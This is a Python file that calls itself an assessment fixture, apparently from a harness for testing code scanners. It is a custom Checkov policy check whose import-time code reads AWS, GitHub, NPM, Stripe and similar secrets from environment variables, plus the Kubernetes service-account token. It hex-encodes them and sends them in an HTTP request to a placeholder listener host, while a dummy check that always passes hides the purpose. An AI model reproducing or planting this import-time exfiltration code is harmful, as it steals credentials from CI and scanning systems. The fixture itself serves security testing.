"""Assessment fixture: custom Checkov check that signals on import.

Real behavior abused
--------------------
Checkov imports every ``*.py`` file inside an ``external-checks-dir`` to discover
``BaseResourceCheck`` subclasses. Import == execution, so the module-level code
below runs inside the scanner process with the scanner's environment and
filesystem access. We don't even need a valid check class; the side effect at
import time is the whole point.

Containment
-----------
The only network destination is the ``__DVAP_LISTENER_HOST__`` placeholder, which
the worker substitutes with the in-network ``listener`` service. Stdlib only.
"""

import os
import urllib.request

from checkov.common.models.enums import CheckCategories, CheckResult
from checkov.terraform.checks.resource.base_resource_check import BaseResourceCheck

# Placeholders are string-replaced by the worker when it lays this repo into a
# per-scan workdir. They never contain a real external host in the repo itself.
SCAN_TOKEN = "__DVAP_SCAN_TOKEN__"
VECTOR = "__DVAP_VECTOR__"
LISTENER_HOST = "__DVAP_LISTENER_HOST__"
LISTENER_PORT = "__DVAP_LISTENER_PORT__"

# Synthetic secrets the scanner process can see (env + k8s SA token file).
SECRET_ENV_KEYS = (
    "AWS_ACCESS_KEY_ID",
    "AWS_SECRET_ACCESS_KEY",
    "AWS_CANARY_ACCESS_KEY_ID",
    "AWS_CANARY_SECRET_ACCESS_KEY",
    "AWS_SESSION_TOKEN",
    "GITHUB_TOKEN",
    "GITHUB_CANARY_TOKEN",
    "NPM_TOKEN",
    "APP_DATABASE_URL",
    "STRIPE_API_KEY",
    "SLACK_WEBHOOK_URL",
)
K8S_TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token"


def _collect_exfil():
    """Newline-joined KEY=VALUE of every synthetic secret we can read (§6a)."""
    lines = []
    for key in SECRET_ENV_KEYS:
        val = os.environ.get(key)
        if val:
            lines.append(key + "=" + val)
    try:
        with open(K8S_TOKEN_PATH, encoding="utf-8") as fh:
            lines.append("K8S_SA_TOKEN=" + fh.read().strip())
    except OSError:
        pass
    return "\n".join(lines)


def _dotted_hex(payload):
    """Hex-encode UTF-8 bytes, then split into ~60-char dotted chunks (§6a)."""
    hexed = payload.encode("utf-8").hex()
    return ".".join(hexed[i : i + 60] for i in range(0, len(hexed), 60))


def _beacon():
    """Fire a single GET to the listener with the dotted-hex exfil."""
    marker_name = "".join(
        ch if ch.isalnum() or ch in ("-", "_") else "_"
            for ch in f"assessment_checkov_{SCAN_TOKEN}_{VECTOR}.sent"
    )
    marker_path = os.path.join("/tmp", marker_name[:180])
    try:
        marker_fd = os.open(marker_path, os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o600)
        os.close(marker_fd)
    except FileExistsError:
        return
    except OSError:
        # If /tmp is unavailable, keep the fixture behavior rather than failing.
        pass

    dotted = _dotted_hex(_collect_exfil())
    url = (
        "http://"
        + LISTENER_HOST
        + ":"
        + str(LISTENER_PORT)
        + "/b/"
        + SCAN_TOKEN
        + "/"
        + VECTOR
        + "?d="
        + dotted
    )
    try:
        urllib.request.urlopen(url, timeout=5).read()
    except Exception:
        # Network failures must never crash the host analyzer.
        pass


# Side effect at import time.
_beacon()


class RepositoryPolicyCheck(BaseResourceCheck):
    """Minimal valid Checkov custom check so the external-check loader imports us."""

    def __init__(self):
        super().__init__(
            name="Repository external check import review",
            id="CKV_REPO_1",
            categories=[CheckCategories.GENERAL_SECURITY],
            supported_resources=["aws_s3_bucket"],
        )

    def scan_resource_conf(self, conf):
        return CheckResult.PASSED


check = RepositoryPolicyCheck()
